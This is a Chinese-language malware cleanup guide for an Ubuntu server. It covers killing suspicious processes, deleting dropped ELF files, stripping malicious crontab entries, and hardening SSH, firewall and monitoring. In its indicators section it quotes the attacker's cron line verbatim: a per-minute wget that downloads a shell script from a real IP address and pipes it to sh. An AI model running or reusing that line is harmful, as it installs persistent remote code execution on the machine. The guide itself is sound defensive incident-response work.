# 恶意软件清理指南

## 紧急情况

如果发现以下情况，立即执行清理：

1. **可疑文件** - 随机字符串命名的可执行文件
2. **恶意定时任务** - 从可疑 IP 下载并执行脚本
3. **高 CPU/内存使用** - 可能是挖矿程序
4. **异常网络连接** - 连接到可疑 IP

## 立即执行清理

### 步骤 1: 运行清理脚本

```bash
# 在服务器上执行
cd /home/ubuntu/telegram-ai-system
git pull origin main

# 运行完整清理
bash scripts/server/cleanup-malware.sh

# 专门清理定时任务
bash scripts/server/remove-malicious-cron.sh
```

### 步骤 2: 手动清理（如果脚本无法运行）

```bash
# 1. 终止可疑进程
ps aux | grep -E "MUTA71VL|CX81yM9aE|80.64.16.241"
sudo pkill -9 -f MUTA71VL
sudo pkill -9 -f CX81yM9aE

# 2. 备份并删除可疑文件
sudo cp /data/MUTA71VL /tmp/MUTA71VL.backup
sudo cp /data/CX81yM9aE /tmp/CX81yM9aE.backup
sudo rm -f /data/MUTA71VL /data/CX81yM9aE /data/UY

# 3. 清理恶意定时任务
crontab -l > /tmp/crontab_backup.txt  # 备份
crontab -l | grep -v "80.64.16.241" | grep -v "unk.sh" | crontab -  # 删除恶意任务

# 4. 检查系统定时任务
sudo cat /etc/crontab
sudo ls -la /etc/cron.d/
```

## 发现的恶意软件特征

### 可疑文件

- `/data/MUTA71VL` - ELF 64-bit 可执行文件，2.8MB
- `/data/CX81yM9aE` - ELF 64-bit 可执行文件，3.7MB
- `/data/UY` - JSON 文件，11KB

**特征：**
- 随机字符串命名
- 可执行权限 (755)
- 静态链接的 ELF 可执行文件
- 创建时间相同（可能是批量部署）

### 恶意定时任务

```bash
* * * * * wget -q -O - http://80.64.16.241/unk.sh | sh > /dev/null 2>&1
```

**特征：**
- 每分钟执行一次 (`* * * * *`)
- 从可疑 IP (`80.64.16.241`) 下载脚本
- 直接执行下载的脚本 (`| sh`)
- 隐藏输出 (`> /dev/null 2>&1`)

## 清理后的安全措施

### 1. 更改所有密码

```bash
# SSH 密码
passwd

# 数据库密码（如果使用）
# 应用密码
# 其他服务密码
```

### 2. 检查其他服务器

```bash
# 检查其他服务器是否也被感染
# 运行相同的诊断脚本
bash scripts/server/check-security-threats.sh
```

### 3. 运行安全扫描

```bash
# 安装安全工具（如果未安装）
sudo apt-get install rkhunter chkrootkit debsums

# 更新 rkhunter 数据库
sudo rkhunter --update

# 运行完整扫描
sudo rkhunter --check

# 运行 chkrootkit
sudo chkrootkit

# 检查系统完整性
sudo debsums -c
```

### 4. 加强系统安全

```bash
# 1. 更新系统
sudo apt-get update && sudo apt-get upgrade

# 2. 配置防火墙
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# 3. 禁用 root 登录（如果使用 SSH）
sudo nano /etc/ssh/sshd_config
# 设置: PermitRootLogin no
sudo systemctl restart sshd

# 4. 配置 SSH 密钥认证（禁用密码认证）
sudo nano /etc/ssh/sshd_config
# 设置: PasswordAuthentication no
# 设置: PubkeyAuthentication yes
sudo systemctl restart sshd

# 5. 安装 fail2ban（防止暴力破解）
sudo apt-get install fail2ban
sudo systemctl enable fail2ban
sudo systemctl start fail2ban
```

### 5. 监控系统

```bash
# 设置定期检查
# 添加到 crontab（清理后的安全 crontab）
0 2 * * * /path/to/check-security-threats.sh >> /var/log/security-check.log 2>&1

# 监控系统资源
watch -n 5 'ps aux --sort=-%cpu | head -10'
watch -n 5 'free -h'
```

## 预防措施

### 1. 定期更新系统

```bash
# 设置自动更新
sudo apt-get install unattended-upgrades
sudo dpkg-reconfigure -plow unattended-upgrades
```

### 2. 定期安全扫描

```bash
# 每周运行一次
sudo rkhunter --check
sudo chkrootkit
```

### 3. 监控异常活动

- 监控 CPU/内存使用
- 监控网络连接
- 监控文件系统变化
- 监控登录尝试

### 4. 备份重要数据

```bash
# 定期备份
# 使用 rsync、tar 或其他备份工具
```

## 验证清理是否成功

### 检查清单

- [ ] 可疑进程已终止
- [ ] 可疑文件已删除
- [ ] 恶意定时任务已清理
- [ ] 系统资源使用正常（CPU < 50%, 内存 < 80%）
- [ ] 无异常网络连接
- [ ] 安全扫描通过
- [ ] 所有密码已更改
- [ ] 防火墙已配置
- [ ] SSH 安全配置已加强

### 验证命令

```bash
# 检查进程
ps aux | grep -E "MUTA71VL|CX81yM9aE|80.64.16.241"

# 检查文件
ls -la /data/

# 检查定时任务
crontab -l
sudo cat /etc/crontab
sudo ls -la /etc/cron.d/

# 检查网络连接
ss -tunp | grep "80.64.16.241"

# 检查系统资源
top
free -h

# 运行安全扫描
sudo rkhunter --check
```

## 如果问题持续

如果清理后问题仍然存在：

1. **考虑重新安装系统** - 最彻底的方法
2. **从备份恢复** - 如果有无感染的备份
3. **联系安全专家** - 进行深度分析
4. **检查入侵路径** - 找出如何被感染的

## 相关文档

- [系统崩溃诊断](./SYSTEM_CRASH_DIAGNOSIS.md)
- [安全威胁检查](./WORKER_CONNECTION_TROUBLESHOOTING.md)

